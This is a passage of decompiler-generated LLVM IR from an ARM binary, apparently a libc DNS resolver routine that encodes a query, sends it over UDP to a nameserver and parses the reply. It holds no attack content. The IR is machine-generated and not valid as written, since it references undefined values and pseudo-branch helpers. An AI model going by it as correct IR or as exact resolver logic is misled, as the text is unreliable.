  %v1_2f50c = phi i32 [ -1, %dec_label_pc_2f48c ], [ %v3_2f6ec, %dec_label_pc_2fb4c ]
  store i32 %v1_2f50c, i32* %r3.global-to-local, align 4
  %v2_2f508 = icmp eq i32 %v1_2f50c, -1
  store i1 %v2_2f508, i1* %cpsr_c.global-to-local, align 1
  %v7_2f508 = icmp eq i32 %v1_2f50c, -1
  br i1 %v7_2f508, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_2f504
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_2f504, %bb215
  %v1_2f510 = xor i1 %v7_2f508, true
  call void @__pseudo_cond_branch(i1 %v1_2f510, i32 ptrtoint (i32* @global_var_235b8.2048 to i32))
  store i32 96, i32* @r7, align 4
  %v0_2f51c = load i32, i32* @r8, align 4
  %v2_2f51c = add i32 %v0_2f51c, 100
  %v3_2f51c = inttoptr i32 %v2_2f51c to i32*
  %v4_2f51c = load i32, i32* %v3_2f51c, align 4
  store i32 %v4_2f51c, i32* @r4, align 4
  store i32 %v2_2f520, i32* @r5, align 4
  store i32 164, i32* %ip.global-to-local, align 4
  %v2_2f52c = add i32 %v0_2f51c, 96
  %v3_2f52c = inttoptr i32 %v2_2f52c to i32*
  %v4_2f52c = load i32, i32* %v3_2f52c, align 4
  store i32 %v4_2f52c, i32* %r1.global-to-local, align 4
  %v2_2f534 = add i32 %v0_2f51c, 164
  %v3_2f534 = inttoptr i32 %v2_2f534 to i32*
  %v4_2f534 = load i32, i32* %v3_2f534, align 4
  store i32 %v4_2f534, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2f534)
  store i32 36, i32* %r1.global-to-local, align 4
  %v0_2f548 = load i32, i32* @r8, align 4
  %v2_2f548 = add i32 %v0_2f548, 36
  %v3_2f548 = inttoptr i32 %v2_2f548 to i32*
  %v4_2f548 = load i32, i32* %v3_2f548, align 4
  store i32 %v4_2f548, i32* %ip.global-to-local, align 4
  store i32 193876, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2f548)
  %v0_2f554 = call i32 @__open_nameservers()
  %v0_2f55c = load i32, i32* @r8, align 4
  %v2_2f55c = add i32 %v0_2f55c, ptrtoint (i32* @global_var_f230.2043 to i32)
  %v3_2f55c = inttoptr i32 %v2_2f55c to i32*
  %v4_2f55c = load i32, i32* %v3_2f55c, align 4
  store i32 %v1_2f464, i32* %r3.global-to-local, align 4
  store i32 %v3_2f430, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_2f56c = load i32, i32* @sb, align 4
  %v3_2f56c = icmp uge i32 %v0_2f56c, %v4_2f55c
  store i1 %v3_2f56c, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_2f574, align 1
  %v0_2f578 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2f578, label %dec_label_pc_2f5a4, label %dec_label_pc_2f57c

dec_label_pc_2f57c:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_2f584 = load i32, i32* %ip.global-to-local, align 4
  %v4_2f584 = add i32 %v3_2f584, %v1_2f464
  %v5_2f584 = inttoptr i32 %v4_2f584 to i8*
  store i8 46, i8* %v5_2f584, align 1
  store i32 61988, i32* %r1.global-to-local, align 4
  %v0_2f590 = load i32, i32* @r8, align 4
  %v2_2f590 = add i32 %v0_2f590, 61988
  %v3_2f590 = inttoptr i32 %v2_2f590 to i32*
  %v4_2f590 = load i32, i32* %v3_2f590, align 4
  store i32 %v4_2f590, i32* %r3.global-to-local, align 4
  %v1_2f598 = load i32, i32* %ip.global-to-local, align 4
  %v2_2f598 = add i32 %v1_2f594, %v1_2f598
  %v1_2f59c = load i32, i32* @sb, align 4
  %v2_2f59c = and i32 %v1_2f59c, 1073741824
  %v3_2f59c = icmp ne i32 %v2_2f59c, 0
  store i1 %v3_2f59c, i1* %cpsr_c.global-to-local, align 1
  %v4_2f59c = mul i32 %v1_2f59c, 4
  %v5_2f59c = add i32 %v4_2f59c, %v4_2f590
  %v6_2f59c = inttoptr i32 %v5_2f59c to i32*
  %v7_2f59c = load i32, i32* %v6_2f59c, align 4
  store i32 %v7_2f59c, i32* @r1, align 4
  %v2_2f5a0 = inttoptr i32 %v2_2f598 to i8*
  %v3_2f5a0 = call i32 @strcpy(i8* %v2_2f5a0, i32 %v7_2f59c)
  br label %dec_label_pc_2f5a4

dec_label_pc_2f5a4:                               ; preds = %bb216, %dec_label_pc_2f57c
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f5a8 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_2f5a8, label %dec_label_pc_2f5b0, label %dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge

dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge:  ; preds = %dec_label_pc_2f5a4
  %v0_2f5e8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_2f5e0

dec_label_pc_2f5b0:                               ; preds = %dec_label_pc_2f5a4
  store i32 61996, i32* %r3.global-to-local, align 4
  store i32 20867, i32* %ip.global-to-local, align 4
  %v0_2f5b8 = load i32, i32* @r8, align 4
  %v2_2f5b8 = add i32 %v0_2f5b8, 61996
  %v3_2f5b8 = inttoptr i32 %v2_2f5b8 to i32*
  %v4_2f5b8 = load i32, i32* %v3_2f5b8, align 4
  %v2_2f5bc = add i32 %v0_2f5b8, 20867
  %v3_2f5bc = inttoptr i32 %v2_2f5bc to i8*
  %v4_2f5bc = load i8, i8* %v3_2f5bc, align 1
  %v6_2f5bc = zext i8 %v4_2f5bc to i32
  %v2_2f5c0 = mul i32 %v6_2f5bc, %v4_2f5b8
  store i32 %v2_2f5c0, i32* %r3.global-to-local, align 4
  store i32 55944, i32* %r1.global-to-local, align 4
  %v2_2f5cc = add i32 %v0_2f5b8, 20864
  %v3_2f5cc = inttoptr i32 %v2_2f5cc to i16*
  %v4_2f5cc = load i16, i16* %v3_2f5cc, align 2
  %v6_2f5cc = zext i16 %v4_2f5cc to i32
  %v2_2f5d0 = add i32 %v0_2f5b8, 55944
  %v3_2f5d0 = inttoptr i32 %v2_2f5d0 to i32*
  %v4_2f5d0 = load i32, i32* %v3_2f5d0, align 4
  store i32 %v4_2f5d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2f5e0

dec_label_pc_2f5e0:                               ; preds = %dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge, %dec_label_pc_2f5b0
  %v2_2f624 = phi i32 [ %v0_2f5b8, %dec_label_pc_2f5b0 ], [ %v0_2f5e8.pre, %dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_2f5cc, %dec_label_pc_2f5b0 ], [ %stack_var_-464.0, %dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_2f5d0, %dec_label_pc_2f5b0 ], [ %stack_var_-468.0, %dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_2f5c0, %dec_label_pc_2f5b0 ], [ %stack_var_-476.0, %dec_label_pc_2f5a4.dec_label_pc_2f5e0_crit_edge ]
  store i32 61996, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_2f5e8 = add i32 %v2_2f624, 61996
  %v3_2f5e8 = inttoptr i32 %v2_2f5e8 to i32*
  %v4_2f5e8 = load i32, i32* %v3_2f5e8, align 4
  store i32 61992, i32* %r3.global-to-local, align 4
  %v3_2f5f0 = icmp uge i32 %stack_var_-468.1, %v4_2f5e8
  store i1 %v3_2f5f0, i1* %cpsr_c.global-to-local, align 1
  %v2_2f5f4 = add i32 %v2_2f624, 61992
  %v3_2f5f4 = inttoptr i32 %v2_2f5f4 to i32*
  %v4_2f5f4 = load i32, i32* %v3_2f5f4, align 4
  store i32 %v4_2f5f4, i32* %r3.global-to-local, align 4
  br i1 %v3_2f5f0, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_2f5e0
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_2f5e0, %bb217
  %v0_2f600 = phi i32 [ %stack_var_-468.1, %dec_label_pc_2f5e0 ], [ 0, %bb217 ]
  %v3_2f600 = mul i32 %v0_2f600, 28
  %v4_2f600 = add i32 %v3_2f600, %v4_2f5f4
  store i32 %v4_2f600, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_2f60c = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_2f618 = urem i32 %v1_2f60c, 65536
  store i32 55944, i32* %r1.global-to-local, align 4
  %v1_2f624 = trunc i32 %v1_2f60c to i16
  %v4_2f624 = add i32 %v2_2f624, 20864
  %v5_2f624 = inttoptr i32 %v4_2f624 to i16*
  store i16 %v1_2f624, i16* %v5_2f624, align 2
  %v1_2f62c = load i32, i32* @r8, align 4
  %v2_2f62c = load i32, i32* %r1.global-to-local, align 4
  %v3_2f62c = add i32 %v2_2f62c, %v1_2f62c
  %v4_2f62c = inttoptr i32 %v3_2f62c to i32*
  store i32 %v0_2f600, i32* %v4_2f62c, align 4
  %v0_2f630 = load i32, i32* %r3.global-to-local, align 4
  %v1_2f634 = inttoptr i32 %v0_2f630 to i32*
  %v2_2f634 = load i32, i32* %v1_2f634, align 4
  %v3_2f634 = add i32 %v0_2f630, 4
  %v4_2f634 = inttoptr i32 %v3_2f634 to i32*
  %v5_2f634 = load i32, i32* %v4_2f634, align 4
  store i32 %v5_2f634, i32* %r1.global-to-local, align 4
  %v9_2f634 = add i32 %v0_2f630, 12
  %v10_2f634 = inttoptr i32 %v9_2f634 to i32*
  %v11_2f634 = load i32, i32* %v10_2f634, align 4
  store i32 %v11_2f634, i32* %r3.global-to-local, align 4
  %v12_2f634 = add i32 %v0_2f630, 16
  %v4_2f63c = trunc i32 %v2_2f634 to i16
  store i16 %v4_2f63c, i16* %stack_var_-104, align 2
  store i32 %v15_2f63c, i32* %ip.global-to-local, align 4
  %v1_2f640 = inttoptr i32 %v12_2f634 to i32*
  %v2_2f640 = load i32, i32* %v1_2f640, align 4
  %v3_2f640 = add i32 %v0_2f630, 20
  %v4_2f640 = inttoptr i32 %v3_2f640 to i32*
  %v5_2f640 = load i32, i32* %v4_2f640, align 4
  store i32 %v5_2f640, i32* %r1.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 %v2_2f640, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_2f654 = load i32, i32* @r8, align 4
  %v2_2f654 = add i32 %v0_2f654, 76
  %v3_2f654 = inttoptr i32 %v2_2f654 to i32*
  %v4_2f654 = load i32, i32* %v3_2f654, align 4
  store i32 %v4_2f654, i32* %ip.global-to-local, align 4
  store i32 194144, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2f654)
  store i32 %v2_2f660, i32* @r6, align 4
  %v0_2f664 = load i32, i32* @r7, align 4
  store i32 %v0_2f664, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v0_2f66c = load i32, i32* @sl, align 4
  store i32 %v0_2f66c, i32* @r0, align 4
  %v0_2f670 = call i32 @__GI_memset()
  %v0_2f674 = load i32, i32* @r7, align 4
  store i32 %v0_2f674, i32* @r1, align 4
  store i32 48, i32* @r2, align 4
  store i32 %v2_2f660, i32* @r0, align 4
  %v0_2f680 = call i32 @__GI_memset()
  store i32 %v3_2f618, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_2f690 = load i32, i32* @sl, align 4
  store i32 %v0_2f690, i32* %r1.global-to-local, align 4
  store i32 %v3_2f618, i32* %stack_var_-192, align 4
  %v6_2f6a4 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_2f690, i32 512, i32 %v3_2f618, i32 %v3_2f618)
  store i32 %v6_2f6a4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f6a8 = icmp slt i32 %v6_2f6a4, 0
  br i1 %v1_2f6a8, label %dec_label_pc_2fb64, label %dec_label_pc_2f6b0

dec_label_pc_2f6b0:                               ; preds = %bb218
  store i32 %v0_2f41c, i32* @ip, align 4
  store i32 %v1_2f464, i32* @r5, align 4
  %v0_2f6c0 = load i32, i32* @sl, align 4
  %v2_2f6c0 = add i32 %v0_2f6c0, %v6_2f6a4
  store i32 %v2_2f6c0, i32* %r1.global-to-local, align 4
  %v1_2f6c4 = sub i32 512, %v6_2f6a4
  store i32 %v1_2f464, i32* %stack_var_-60, align 4
  store i32 %v0_2f41c, i32* %stack_var_-56, align 4
  %v4_2f6d0 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_2f6c0, i32 %v1_2f6c4)
  store i32 %v4_2f6d0, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f6d4 = icmp slt i32 %v4_2f6d0, 0
  br i1 %v1_2f6d4, label %dec_label_pc_2fb64, label %dec_label_pc_2f6dc

dec_label_pc_2f6dc:                               ; preds = %dec_label_pc_2f6b0
  %v3_2f6e0 = load i16, i16* %stack_var_-104, align 2
  %v4_2f6e0 = sext i16 %v3_2f6e0 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_2f6ec = call i32 @socket(i32 %v4_2f6e0, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f6f0 = icmp slt i32 %v3_2f6ec, 0
  br i1 %v1_2f6f0, label %dec_label_pc_2fb3c, label %dec_label_pc_2f6fc

dec_label_pc_2f6fc:                               ; preds = %dec_label_pc_2f6dc
  store i32 %v2_2f638, i32* %r1.global-to-local, align 4
  %v3_2f704 = call i32 @__libc_connect(i32 %v3_2f6ec, i32 %v2_2f638, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f708 = icmp slt i32 %v3_2f704, 0
  br i1 %v1_2f708, label %dec_label_pc_2fb3c, label %dec_label_pc_2f710

dec_label_pc_2f710:                               ; preds = %dec_label_pc_2f6fc
  %v0_2f710 = load i32, i32* @r5, align 4
  %v1_2f710 = load i32, i32* @r4, align 4
  %v2_2f710 = add i32 %v1_2f710, %v0_2f710
  %v0_2f714 = load i32, i32* @r7, align 4
  store i32 %v0_2f714, i32* %r3.global-to-local, align 4
  %v0_2f71c = load i32, i32* @sl, align 4
  store i32 %v0_2f71c, i32* %r1.global-to-local, align 4
  %v4_2f720 = call i32 @__libc_send(i32 %v3_2f6ec, i32 %v0_2f71c, i32 %v2_2f710, i32 %v0_2f714)
  store i32 20866, i32* %r3.global-to-local, align 4
  %v0_2f728 = load i32, i32* @r8, align 4
  %v2_2f728 = add i32 %v0_2f728, 20866
  %v3_2f728 = inttoptr i32 %v2_2f728 to i8*
  %v4_2f728 = load i8, i8* %v3_2f728, align 1
  %v6_2f728 = zext i8 %v4_2f728 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_2f730 = mul nuw nsw i32 %v6_2f728, 1000
  store i32 %v2_2f730, i32* @r4, align 4
  store i32 %v2_2f734, i32* @r5, align 4
  br label %dec_label_pc_2f738

dec_label_pc_2f738:                               ; preds = %thread-pre-split, %dec_label_pc_2f710
  %v0_2f744 = phi i32 [ %v1_2f784, %thread-pre-split ], [ %v2_2f730, %dec_label_pc_2f710 ]
  store i32 %v3_2f6ec, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_2f740, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_2f6ec, i32* %stack_var_-48, align 4
  %v3_2f758 = call i32 @__GI_poll(i32 %v2_2f734, i32 1, i32 %v0_2f744)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_2f760 = load i32, i32* @sl, align 4
  store i32 %v0_2f760, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v3_2f758, 1
  br i1 %tmp219, label %dec_label_pc_2fb3c, label %dec_label_pc_2f774

dec_label_pc_2f774:                               ; preds = %dec_label_pc_2f738
  %v4_2f774 = call i32 @__libc_recv(i32 %v3_2f6ec, i32 %v0_2f760, i32 512, i32 64)
  %v2_2f778 = icmp ugt i32 %v4_2f774, 10
  store i1 %v2_2f778, i1* %cpsr_c.global-to-local, align 1
  %v8_2f780 = icmp sgt i32 %v4_2f774, 11
  br i1 %v8_2f780, label %dec_label_pc_2f7ac, label %dec_label_pc_2f784

dec_label_pc_2f784:                               ; preds = %dec_label_pc_2f7ac, %dec_label_pc_2f7c8, %dec_label_pc_2f774
  %v0_2f784 = load i32, i32* @r4, align 4
  %v1_2f784 = add i32 %v0_2f784, -1000
  store i32 %v1_2f784, i32* @r4, align 4
  %v7_2f784 = icmp eq i32 %v0_2f784, 1000
  %tmp283 = zext i1 %v7_2f784 to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f794 = icmp slt i32 %v4_2f774, 0
  br i1 %v1_2f794, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_2f784
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_2fb3c

thread-pre-split:                                 ; preds = %dec_label_pc_2f784
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_2f784, label %dec_label_pc_2fb3c, label %dec_label_pc_2f738

dec_label_pc_2f7ac:                               ; preds = %dec_label_pc_2f774
  store i32 %v2_2f660, i32* %r1.global-to-local, align 4
  %v0_2f7b0 = load i32, i32* @sl, align 4
  %v2_2f7b4 = inttoptr i32 %v0_2f7b0 to i8*
  %v3_2f7b4 = call i32 @__decode_header(i8* %v2_2f7b4, i32 %v2_2f660)
  %v3_2f7b8 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_2f7b8, i32* %r3.global-to-local, align 4
  store i32 %v3_2f618, i32* %r1.global-to-local, align 4
  %v3_2f7c0 = icmp uge i32 %v3_2f7b8, %v3_2f618
  store i1 %v3_2f7c0, i1* %cpsr_c.global-to-local, align 1
  %v9_2f7c0 = icmp eq i32 %v3_2f7b8, %v3_2f618
  br i1 %v9_2f7c0, label %dec_label_pc_2f7c8, label %dec_label_pc_2f784

dec_label_pc_2f7c8:                               ; preds = %dec_label_pc_2f7ac
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2f7cc, label %dec_label_pc_2f784, label %dec_label_pc_2f7d4

dec_label_pc_2f7d4:                               ; preds = %dec_label_pc_2f7c8
  store i32 %v1_2f7d8, i32* %r3.global-to-local, align 4
  store i1 %v2_2f7dc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_2f7d8.cmp, label %dec_label_pc_2f810, label %dec_label_pc_2f7e4

dec_label_pc_2f7e4:                               ; preds = %dec_label_pc_2f7d4
  store i1 %v2_2f7e8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_2f7e8, label %dec_label_pc_2f804, label %dec_label_pc_2f7f0

dec_label_pc_2f7f0:                               ; preds = %dec_label_pc_2f7e4
  store i32 %v4_2f55c, i32* @r5, align 4
  %v1_2f7f4 = add i32 %v4_2f55c, -1
  store i32 %v1_2f7f4, i32* %r3.global-to-local, align 4
  %v0_2f7f8 = load i32, i32* @sb, align 4
  %v3_2f7f8 = icmp uge i32 %v0_2f7f8, %v1_2f7f4
  store i1 %v3_2f7f8, i1* %cpsr_c.global-to-local, align 1
  %v5_2f7fc = icmp slt i32 %v0_2f7f8, %v1_2f7f4
  br i1 %v5_2f7fc, label %.thread7, label %dec_label_pc_2f804

.thread7:                                         ; preds = %dec_label_pc_2f7f0
  %v7_2f7fc = add i32 %v0_2f7f8, 1
  br label %dec_label_pc_2fb4c

dec_label_pc_2f804:                               ; preds = %dec_label_pc_2f7f0, %dec_label_pc_2f7e4
  %v0_2f804 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_2f838

dec_label_pc_2f810:                               ; preds = %dec_label_pc_2f7d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2f810, label %dec_label_pc_2f818, label %dec_label_pc_2fb3c

dec_label_pc_2f818:                               ; preds = %dec_label_pc_2f810
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_2f830, label %dec_label_pc_2f840

dec_label_pc_2f830:                               ; preds = %dec_label_pc_2f818
  %v0_2f830 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_2f838

dec_label_pc_2f838:                               ; preds = %dec_label_pc_2f804, %dec_label_pc_2f830
  %storemerge2 = phi i32 [ %v0_2f830, %dec_label_pc_2f830 ], [ %v0_2f804, %dec_label_pc_2f804 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_2f830 ], [ 1, %dec_label_pc_2f804 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_2f838 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_2f838, align 4
  br label %dec_label_pc_2fb84

dec_label_pc_2f840:                               ; preds = %dec_label_pc_2f818
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_2f844.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_2f844 = add i32 %v0_2f844.pre, 12
  store i32 %v2_2f844, i32* @r4, align 4
  %v3_2f844 = icmp ugt i32 %v0_2f844.pre, -13
  store i1 %v3_2f844, i1* %cpsr_c.global-to-local, align 1
  %v9_2f844 = icmp eq i32 %v2_2f844, 0
  br i1 %v9_2f844, label %dec_label_pc_2fb3c, label %dec_label_pc_2f84c

dec_label_pc_2f84c:                               ; preds = %dec_label_pc_2f840
  %v2_2f850 = add i32 %v4_2f774, -12
  store i32 %v2_2f850, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_2f850, 1
  br i1 %tmp223, label %dec_label_pc_2fb3c, label %dec_label_pc_2f860

dec_label_pc_2f858thread-pre-split:               ; preds = %dec_label_pc_2f87c
  %v2_2f88815 = add i32 %v2_2f86c, -1
  store i32 %v2_2f88815, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_2f88815, 1
  br i1 %tmp224, label %dec_label_pc_2fb3c, label %dec_label_pc_2f860

dec_label_pc_2f860:                               ; preds = %dec_label_pc_2f84c, %dec_label_pc_2f858thread-pre-split
  %v1_2f884 = phi i32 [ %v2_2f88815, %dec_label_pc_2f858thread-pre-split ], [ %v2_2f850, %dec_label_pc_2f84c ]
  %v0_2f860 = phi i32 [ %v2_2f874, %dec_label_pc_2f858thread-pre-split ], [ %v2_2f844, %dec_label_pc_2f84c ]
  %v1_2f860 = inttoptr i32 %v0_2f860 to i8*
  %v2_2f860 = load i8, i8* %v1_2f860, align 1
  %v3_2f860 = zext i8 %v2_2f860 to i32
  store i32 %v3_2f860, i32* %r3.global-to-local, align 4
  %v5_2f860 = add i32 %v0_2f860, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2f864 = icmp eq i8 %v2_2f860, 0
  %v2_2f86c = sub i32 %v1_2f884, %v3_2f860
  store i32 %v2_2f86c, i32* @lr, align 4
  %v1_2f870 = and i32 %v3_2f860, 192
  store i32 %v1_2f870, i32* @ip, align 4
  %v2_2f874 = add i32 %v3_2f860, %v5_2f860
  br i1 %v2_2f864, label %dec_label_pc_2f890, label %dec_label_pc_2f87c

dec_label_pc_2f87c:                               ; preds = %dec_label_pc_2f860
  %v2_2f87c = icmp eq i32 %v1_2f870, 192
  store i1 %v2_2f87c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2f87c, label %.thread9, label %dec_label_pc_2f858thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_2f87c
  %v2_2f880 = add i32 %v0_2f860, 2
  %v2_2f884 = add i32 %v1_2f884, -2
  store i32 %v2_2f884, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2f890

dec_label_pc_2f890:                               ; preds = %dec_label_pc_2f860, %.thread9
  %v1_2f89c = phi i32 [ %v2_2f880, %.thread9 ], [ %v5_2f860, %dec_label_pc_2f860 ]
  %v0_2f890 = phi i32 [ %v2_2f884, %.thread9 ], [ %v1_2f884, %dec_label_pc_2f860 ]
  %v1_2f890 = add i32 %v0_2f890, -3
  %v2_2f890 = icmp ugt i32 %v0_2f890, 2
  store i1 %v2_2f890, i1* %cpsr_c.global-to-local, align 1
  %v3_2f890 = sub i32 2, %v0_2f890
  %v4_2f890 = and i32 %v3_2f890, %v0_2f890
  %v5_2f890 = icmp slt i32 %v4_2f890, 0
  %v6_2f890 = icmp slt i32 %v1_2f890, 0
  %v7_2f890 = icmp eq i32 %v0_2f890, 3
  %v3_2f894 = xor i1 %v6_2f890, %v5_2f890
  %v4_2f894 = or i1 %v7_2f890, %v3_2f894
  br i1 %v4_2f894, label %dec_label_pc_2fb3c, label %dec_label_pc_2f898

dec_label_pc_2f898:                               ; preds = %dec_label_pc_2f890
  %v1_2f898 = sub i32 -8, %v0_2f844.pre
  %v2_2f89c = add i32 %v1_2f89c, %v1_2f898
  store i32 %v2_2f89c, i32* %r3.global-to-local, align 4
  %v3_2f89c = icmp ult i32 %v2_2f89c, %v1_2f898
  store i1 %v3_2f89c, i1* %cpsr_c.global-to-local, align 1
  %v8_2f89c = icmp slt i32 %v2_2f89c, 0
  br i1 %v8_2f89c, label %dec_label_pc_2fb3c, label %dec_label_pc_2f8c0

dec_label_pc_2f8c0:                               ; preds = %dec_label_pc_2f898
  %v2_2f8a8 = add i32 %v2_2f89c, 12
  store i32 %v2_2f8a8, i32* %r1.global-to-local, align 4
  store i32 %v2_2f8c8, i32* @r5, align 4
  store i32 %v2_2f8cc, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_2fb1056, label %dec_label_pc_2f8e4, label %dec_label_pc_2fb14

dec_label_pc_2f8e4:                               ; preds = %dec_label_pc_2f8c0, %dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge
  %v0_2f8e8 = phi i32 [ %v0_2f8e8.pre, %dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge ], [ %v0_2f844.pre, %dec_label_pc_2f8c0 ]
  %stack_var_-460.364 = phi i32 [ %v2_2faf4, %dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge ], [ %v2_2f8a8, %dec_label_pc_2f8c0 ]
  %stack_var_-452.061 = phi i32 [ %v1_2faf8, %dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge ], [ 0, %dec_label_pc_2f8c0 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_2faec.dec_label_pc_2f8e4_crit_edge ], [ 1, %dec_label_pc_2f8c0 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_2f8c8, i32* @r3, align 4
  %v2_2f8fc = call i32 @__decode_dotted(i32 %v0_2f8e8, i32 %stack_var_-460.364)
  store i32 %v2_2f8fc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2f900 = icmp slt i32 %v2_2f8fc, 0
  br i1 %v1_2f900, label %dec_label_pc_2f9d0, label %dec_label_pc_2f908

dec_label_pc_2f908:                               ; preds = %dec_label_pc_2f8e4
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_2f910 = add i32 %v2_2f8fc, 10
  store i32 %v1_2f910, i32* @sb, align 4
  %v2_2f914 = sub i32 %v4_2f774, %stack_var_-460.364
  %v2_2f918 = sub i32 %v2_2f914, %v1_2f910
  store i32 %v2_2f918, i32* %r3.global-to-local, align 4
  %v3_2f918 = icmp uge i32 %v2_2f914, %v1_2f910
  store i1 %v3_2f918, i1* %cpsr_c.global-to-local, align 1
  %v8_2f918 = icmp slt i32 %v2_2f918, 0
  br i1 %v8_2f918, label %dec_label_pc_2f9c8.thread, label %dec_label_pc_2f928

dec_label_pc_2f9c8.thread:                        ; preds = %dec_label_pc_2f908
  store i32 %v2_2f918, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_2f9d0

dec_label_pc_2f928:                               ; preds = %dec_label_pc_2f908
  %v2_2f92c = call i32 @__GI_strdup(i8* %v1_2f92c)
  %v0_2f934 = load i32, i32* @r4, align 4
  %v2_2f934 = add i32 %v0_2f934, %stack_var_-460.364
  %v0_2f938 = load i32, i32* @sl, align 4
  %v2_2f938 = add i32 %v0_2f938, %v2_2f934
  store i32 %v2_2f938, i32* %r1.global-to-local, align 4
  %v1_2f93c = add i32 %v2_2f938, 2
  store i32 %v1_2f93c, i32* %ip.global-to-local, align 4
  %v1_2f940 = add i32 %v2_2f938, 4
  store i32 %v1_2f940, i32* %r3.global-to-local, align 4
  %v1_2f944 = add i32 %v2_2f938, 5
  %v2_2f944 = inttoptr i32 %v1_2f944 to i8*
  %v3_2f944 = load i8, i8* %v2_2f944, align 1
  %v4_2f944 = zext i8 %v3_2f944 to i32
  %v1_2f94c = add i32 %v2_2f938, 8
